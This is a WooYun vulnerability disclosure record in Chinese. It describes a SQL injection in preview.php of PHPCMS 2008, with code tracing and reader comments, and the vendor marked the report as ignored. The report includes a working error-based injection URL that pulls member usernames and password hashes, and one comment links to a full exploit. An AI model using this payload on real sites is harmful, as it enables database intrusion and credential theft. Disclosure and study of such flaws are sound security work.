{"id": 13281, "wybug_id": "wooyun-2013-022112", "wybug_title": "PHPCMS 2008 最新漏洞（第二季）", "wybug_corp": "phpcms", "wybug_author": "西毒", "wybug_date": "2013-04-18 22:40", "wybug_open_date": "2013-04-23 22:40", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 第二季来了哈...亲 详细说明：  在preview.php 中第7行$r = new_stripslashes($info);我们跟踪new_stripslashes这个函数在global.func.php中可以找到\nfunction new_stripslashes($string){    if(!is_array($string)) return stripslashes($string);    foreach($string as $key => $val) $string[$key] = new_stripslashes($val);    return $string;}\n这个函数的功能不用解释了吧所以我们看具体应用点再哪？\nrequire dirname(__FILE__).'/include/common.inc.php';if(!$_userid) showmessage('禁止访问'); // 所以前提是我们注册个会员就ok了.require_once CACHE_MODEL_PATH.'content_output.class.php';require_once 'output.class.php';if(!is_array($info)) showmessage('信息预览不能翻页');//这里将要带进来我们的危险参数了$r = new_stripslashes($info);   //反转义了.....关键$C = cache_read('category_'.$r['catid'].'.php');$out = new content_output();$r['userid'] = $_userid;$r['inputtime'] = TIME;$data = $out->get($r);extract($data);$userid = $_username;for($i=1;$i<10;$i++){    $str_attachmentArray[$i] = array(\"filepath\" => \"images/preview.gif\",\"description\" => \"这里是图片的描述\",\"thumb\"=>\"images/thumb_60_60_preview.gif\");}        $array_images = $str_attachmentArray;$images_number = 10;$allow_priv = $allow_readpoint = 1;$updatetime = date('Y-m-d H:i:s',TIME);        $page = max(intval($page), 1);$pages = $titles = '';if(strpos($content, '[page]') !== false)  //这里必须还有这个[page]这个字符.....才能操作哈{    require_once 'url.class.php';    $curl = new url();    $contents = array_filter(explode('[page]', $content));    $pagenumber = count($contents);    for($i=1; $i<=$pagenumber; $i++)    {        $pageurls[$i] = $curl->show($r['contentid'], $i, $r['catid'], $r['inputtime']);//这里contentid进入SQL语句当中    }\n其中细节我就不说了...我们看看这个$curl资源句柄中的show方法\n$pageurls[$i] = $curl->show($r['contentid'], $i, $r['catid'], $r['inputtime']);\n\nfunction show($contentid, $page = 0, $catid = 0, $time = 0, $prefix = '')    {        global $PHPCMS;        if($catid == 0 || $time == 0 || $prefix == '')        {            $r = $this->db->get_one(\"SELECT * FROM `\".DB_PRE.\"content` WHERE `contentid`='$contentid'\");            if($r['isupgrade'] && !empty($r['url']))            {\n所以结合前面的......我们x站了吧www.xxxxx.com/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2' and (select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)-- a\n\n最后想说一句  360漏洞收购计划价格真心低...... 通杀版的getshell 才1500...这么低的价格....我觉得宁愿拒绝好了..   漏洞证明：  在preview.php 中第7行$r = new_stripslashes($info);我们跟踪new_stripslashes这个函数在global.func.php中可以找到\nfunction new_stripslashes($string){    if(!is_array($string)) return stripslashes($string);    foreach($string as $key => $val) $string[$key] = new_stripslashes($val);    return $string;}\n这个函数的功能不用解释了吧所以我们看具体应用点再哪？\nrequire dirname(__FILE__).'/include/common.inc.php';if(!$_userid) showmessage('禁止访问'); // 所以前提是我们注册个会员就ok了.require_once CACHE_MODEL_PATH.'content_output.class.php';require_once 'output.class.php';if(!is_array($info)) showmessage('信息预览不能翻页');//这里将要带进来我们的危险参数了$r = new_stripslashes($info);   //反转义了.....关键$C = cache_read('category_'.$r['catid'].'.php');$out = new content_output();$r['userid'] = $_userid;$r['inputtime'] = TIME;$data = $out->get($r);extract($data);$userid = $_username;for($i=1;$i<10;$i++){    $str_attachmentArray[$i] = array(\"filepath\" => \"images/preview.gif\",\"description\" => \"这里是图片的描述\",\"thumb\"=>\"images/thumb_60_60_preview.gif\");}        $array_images = $str_attachmentArray;$images_number = 10;$allow_priv = $allow_readpoint = 1;$updatetime = date('Y-m-d H:i:s',TIME);        $page = max(intval($page), 1);$pages = $titles = '';if(strpos($content, '[page]') !== false)  //这里必须还有这个[page]这个字符.....才能操作哈{    require_once 'url.class.php';    $curl = new url();    $contents = array_filter(explode('[page]', $content));    $pagenumber = count($contents);    for($i=1; $i<=$pagenumber; $i++)    {        $pageurls[$i] = $curl->show($r['contentid'], $i, $r['catid'], $r['inputtime']);//这里contentid进入SQL语句当中    }\n其中细节我就不说了...我们看看这个$curl资源句柄中的show方法\n$pageurls[$i] = $curl->show($r['contentid'], $i, $r['catid'], $r['inputtime']);\n\nfunction show($contentid, $page = 0, $catid = 0, $time = 0, $prefix = '')    {        global $PHPCMS;        if($catid == 0 || $time == 0 || $prefix == '')        {            $r = $this->db->get_one(\"SELECT * FROM `\".DB_PRE.\"content` WHERE `contentid`='$contentid'\");            if($r['isupgrade'] && !empty($r['url']))            {\n所以结合前面的......我们x站了吧www.xxxxx.com/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2' and (select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)-- a\n\n最后想说一句  360漏洞收购计划价格真心低...... 通杀版的getshell 才1500...这么低的价格....我觉得宁愿拒绝好了..   修复方案：     版权声明：转载请注明来源 西毒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-04-23 22:40 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-18 22:40 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  洞主是个有节操的人 俺们就不去360他们那嘛    \n     2013-04-18 22:42 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  又有大作可以学习了！    \n     2013-04-18 22:49 |    \t\ts3cur1ty \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:12        | s3cur1ty is s3cur1ty!)\t\t \n  这个必须顶，在这里谢谢兄弟帮忙，记得有消息通知我！    \n     2013-04-18 22:52 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  @xsser  说的对，那价格实在是打击到我了     \n     2013-04-18 22:52 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  @s3cur1ty  不会你是360的吧     \n     2013-04-18 22:55 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @西毒 360的还顶你？    \n     2013-04-18 22:57 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  @xsser 我擦....我看他的回复我还以为他是数字公司的....    \n     2013-04-18 23:30 |    \t\tYwiSax \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:4        | 淡定。)\t\t \n  等公开。    \n     2013-04-18 23:32 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  @s3cur1ty 兄弟，终于知道你了....我还误认为是360的    \n     2013-04-18 23:34 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  你们之间的关系好乱。。    \n     2013-04-19 09:58 |    \t\t坏虾 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | From Internet,For Internet……BY：坏虾)\t\t \n  一群好基友。。    \n     2013-04-19 14:11 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  一群好欢乐的基友...    \n     2013-04-23 06:02 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:7        )\t\t \n  亲。。啥时候能开放    \n     2013-04-25 22:48 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  通杀的GETSHELL乌云给10000，哈哈    \n     2013-04-26 01:25 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  @wefgod 10000的话还算可以    \n     2013-11-25 16:50 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  送上exp 喜欢的拿去。http://www.waitalone.cn/phpcms2008-preview-php-injection-exp.html    \n     2013-12-20 16:00 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}